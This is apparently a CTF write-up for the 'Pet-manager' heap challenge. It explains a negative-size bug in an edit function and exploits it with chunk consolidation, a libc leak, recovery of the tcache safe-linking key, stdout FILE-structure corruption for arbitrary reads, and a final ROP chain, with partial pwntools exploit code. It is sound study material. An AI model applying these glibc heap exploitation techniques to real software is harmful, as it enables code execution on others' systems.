# Pet-manager
Despite playing CTF for my entire Saturday, I only managed to solve this challenge for my team, due to some serious shenanigans with the remote instance, so bear in mind that this writeup skips over about 6 hours of frustration. 


## The challenge: 
Running the provided executable, we get the following menu:
```
==========================================
==========Pet Management System===========
==========================================
1. Add a pet
2. Play with pet
3. Show a pet
4. Edit a pet
5. Free a pet
>>> 

``` 
Looks like a relatively standard "heap notes"-style setup. Looking in ghidra, we can confirm that the main functionality we control is allocating and freeing. (FYI: I did my reversing in a temporary folder, like a fool, so I don't have a ton of readable decompiled code to show. I'll go back and re-annotate parts in ghidra when they're super important though). Basically, options 1, 3, 4, and 5 let us interact with heap allocations and number 2 is 
useless.

Let's take a look at how our heap allocations are stored: 
 - Pets are stored in a global array of what are obviously structs, but caused ghidra to have a stroke
 - Important fields are a pointer to the malloc'ed chunk and an 8 byte integer tracking the size. 
 

Assuming the exploit is primarily taking place via the heap, let's take a look at what constraints we have on our allocations, frees, edits, and prints:

##### Allocations:
- Size is between `1` and `0x54F`
- Index our allocation goes in is automatic - we don't choose
- We get 10 allocations max (indices go from 0 to 9)
##### Frees:
- An index is cleared when it's freed
- If the index is empty, return without a call to `free`
##### Edits: 
- Sizes are entered by the user before reading data, and must be less than the size of the allocation. 
- A null byte is added at the end of your input, although it doesn't allow for null byte overflow. 
##### Prints:
- Prints are done as strings, not writes- we can't get leaks if there's any null bytes in the way, which editing adds. 

## The vulnerability
The issue ends up being the function for editing:
```c
void edit_pet(void)

{
  int idx;
  long size;
  
  puts("Enter pet index to edit: ");
  idx = read_number();
  if (((idx < 0) || (9 < idx)) || (*(long *)(&pets + (long)idx * 0x58) == 0)) {
    puts("invalid index");
  }
  else {
    puts("Enter size name to edit: ");
    size = read_number();
    if (*(int *)(&sizes + (long)idx * 0x58) < size) {
      puts("invalid size");
    }
    else {
      puts("Enter name to read: ");
      read_until_newline(0,*(undefined8 *)(&pets + (long)idx * 0x58),size);
    }
  }
  return;
}
```

The size you enter can be negative, and the function for reading a string treats it as unsigned, even though the comparison doesn't. This means entering `-1` lets us read in `0xffffffffffffffff` bytes, effectively turning our read function into `gets()`. 

## The exploit
The trick ended up being chunk consolidation. If we have two chunks and then the wilderness/top chunk, we can fake the size of the first and then free it, so that *both* are consolidated. Then, re-allocate the first one, and allocate again to duplicate the second. I set up a little diagram to explain it better:
<br>
![diagram](/img/consolidate.png)
<br>
<br>
<br>
After we have duplicated chunks, we can start getting stuff done. Our first order of business is going to be a libc leak. The way to do that is to duplicate a larger chunk with our consolidation strategy, then free it to unsortedbin. The first bit of metadata will be to the unsortedbin list head, inside of libc.  
<br>
Here's how I did that in my script:
```py
#I don't know why the sizes are like this, im leaving them so i dont break an offset somewhere tho.
petAdd(64) #Chunk we overflow from 
petAdd(1048) #Chunk to fake the size of
petAdd(64) #Chunk to duplicate


#Overwrite chunk
padding = b'a' * 0x48
newSize = 0x471 # size of our 1048 chunk + size of our 64 chunk + however much extra for metadata
petEdit(0, -1, (padding + p64(newSize)))
petFree(1)

petAdd(1048) #re-allocate idx 1
petAdd(1048) #dup idx 2
petAdd(1048) #setup for the next go around I think, i forget why this is here

petFree(3) #Free one pointer to our duplicated chunk

libcLeak = unp64(petShow(2)) #Print it out and get our libc leak
```

After that, we need to get the XOR key for tcache safe-linking, which we can do by reading a free chunk with nothing after it on the list. We do the same trick from before, and after that, we need to move onto file structs. We're doing this because it removes several limitations of our current reads/writes. Not only does it remove the obstacle of juggling the indices to all our allocations, but we also remove the requirement for 16-byte alignment, the null-byte termination when printing out data, and probably some other obnoxious little constraint I forgot to mention.  
<br><br>
We allocate stdout by overwriting a tcacke `next` ptr, and now I can write an arbitrary read function:
```py
def arbRead(addr, size):
	fileStruct = FileStructure()
	fileStruct.flags = 0xfbad1807
	payload = fileStruct.write(addr=addr, size=size)
	petEdit(4, 64, payload, unsafe=True)
	#proc.recvuntil(b"Size of name: ")
	return proc.recvuntil(b"====")[:-5][-7:]
```
With that, I get a stack leak and a leak of the `.bss`. I tried getting an arbitrary write with the stdin file struct, but that caused some rage-inducing IO problems on the remote instance, so I rewrote my exploit to corrupt the list of allocations stored in the `.bss`. From there it's pretty boring, just gadget offsets and putting the ROPchain onto the stack. 
<b><b><b>
remember kids, largebins are a government psyop.
